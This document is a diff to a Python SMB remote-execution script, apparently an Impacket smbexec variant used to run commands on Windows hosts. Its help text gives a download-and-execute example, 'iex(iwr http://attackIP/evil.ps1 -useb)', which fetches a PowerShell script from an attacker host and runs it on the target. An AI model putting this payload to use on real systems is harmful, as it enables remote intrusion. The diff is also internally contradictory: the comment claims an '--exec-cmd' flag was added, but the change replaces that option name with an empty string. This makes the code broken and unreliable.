@@ -9,6 +9,10 @@
 # of the Apache Software License. See the accompanying LICENSE file
 # for more information.
 #
+#
+# Modifications made by fsor-01 in 2025:
+# - Added support for the --exec-cmd flag
+#
 # Description:
 #   A similar approach to psexec w/o using RemComSvc. The technique is described here
 #   https://web.archive.org/web/20190515131124/https://www.optiv.com/blog/owning-computers-without-shell-access
@@ -302,7 +306,7 @@ if __name__ == '__main__':
 
     parser = argparse.ArgumentParser()
     parser.add_argument('target', action='store', help='[[domain/]username[:password]@]<targetName or address>')
-    parser.add_argument('--exec-cmd', help='Run a custom command directly on the target and exit. eg:  --exec-cmd \'cmd.exe /Q /c powershell.exe /c iex(iwr http://attackIP/evil.ps1 -useb)\'')
+    parser.add_argument('', help='Run a custom command directly on the target and exit. eg:   \'cmd.exe /Q /c powershell.exe /c iex(iwr http://attackIP/evil.ps1 -useb)\'')
     parser.add_argument('-share', action='store', default='C$', help='share to grab output (default C$)')
     parser.add_argument('-mode', action='store', choices={'SERVER','SHARE'}, default='SHARE', help='mode to use')
     parser.add_argument('-ts', action='store_true', help='timestamp logging')
